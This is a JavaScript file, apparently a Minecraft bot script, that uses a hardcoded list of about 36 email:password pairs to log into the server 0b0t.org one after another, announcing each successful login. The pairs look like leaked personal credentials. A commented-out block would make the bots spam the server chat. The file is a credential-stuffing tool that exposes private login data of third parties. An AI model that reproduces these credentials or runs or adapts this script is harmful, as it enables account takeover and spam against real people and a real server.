const mineflayer = require('mineflayer');
const navigatePlugin = require('mineflayer-navigate')(mineflayer);
const vec3 = require('vec3')
var colors = require('colors');

console.log('File Started'.yellow)

function bot(email, password) {
    try {
        var options = {
            host: "0b0t.org",
            port: 25565,
            username: email,
            version: "1.12.2",
            verbose: "true",
            password: password
        };
        var bot = mineflayer.createBot(options)
        navigatePlugin(bot)
        console.log(`Trying with ${email}:${password}`)

        bot.on('login', function () {

            console.log(`${email}:${password} aka ${bot.username} online!`.green)

        })
/*
        setInterval(function () {
            if (bot.username = undefined) {
                return;
            }
            console.log('Attempting chat on ' + bot.username)
            bot.chat(`CCorp spammer on top!! | ${Math.floor(Math.random() * 1000)}`)
            
   
        }, 10000); */
    } catch (error) {
        return;
    }
}

function generateBots() {
    var bots = ['albinengqvist02@gmail.com:System1237', 'magnves@gmail.com:Skilpadde94', 'stacypaq@live.com:bimmer40', 'jaytylerwilliams@gmail.com:ajd97uur', 'josephcstraatmann@gmail.com:Aq1Sw2De3Fr4', 'lindsayk210@gmail.com:lin123', 'piggypigs11501@gmail.com:blankie15', 'djnnayt@hotmail.frgrisone', 'bobbiwalker1002@gmail.com:softball10', 'kojima.kevin@gmail.com:kobesan12', 'hellsing303@gmail.com:rpxeh7cv', 'francodardenne99@hotmail.com:franco123', 'evanmartin76@gmail.com:Lexilu09', 'Ammar312DX@gmail.com:**Ammar312**', 'fruticakebussiness@gmail.com:mayaank15', 'zombulbro@gmail.com:soul12', 'wilbur608@gmail.com:ortho123', 'kristianottesen@live.nolixxer1337', 'lilstevie@lilstevie.geek.nz:Suckme134', 'billy5987@gmail.com:0liver01', 'p1000009654@gmail.com:Vicalex0168', 'samwpage5@gmail.com:dhs.2012', 'dgkawesome42@gmail.com:Mamalorena12', 'superdave_1216@yahoo.com:soccer2013', 'alloradora@yahoo.com:roman!', 'r.wingartz@gmx.deBegobew5', 'htaylor331@yahoo.com:Htaylor4', 'ladygold17350@yahoo.com:1Cameron', 'skyl3r2011@hotmail.com:ilovelizzy123', 'zespy111@hotmail.com:nerftoy22', 'Dturchindakota@aol.com:Serious13', 'sounderground@hotmail.com:smokey16', 'donavonmitch@yahoo.com:Dmitc123', 'kauany_aguas@hotmail.com:edi221207', 'toby.demais@live.com:10101999mgamer4231@web.de:Schildi2', 'fastfreakkiller@googlemail.com:Mariusmax2000']
    setInterval(function () {
        if (bots[0] === undefined) {
            return(console.log('Out of accounts!'))
        }
        let x = bots.shift()
        var y = x.split(" ")[0].split(":");
        bot(y[0], y[1])
    }, 10000)
}

generateBots()
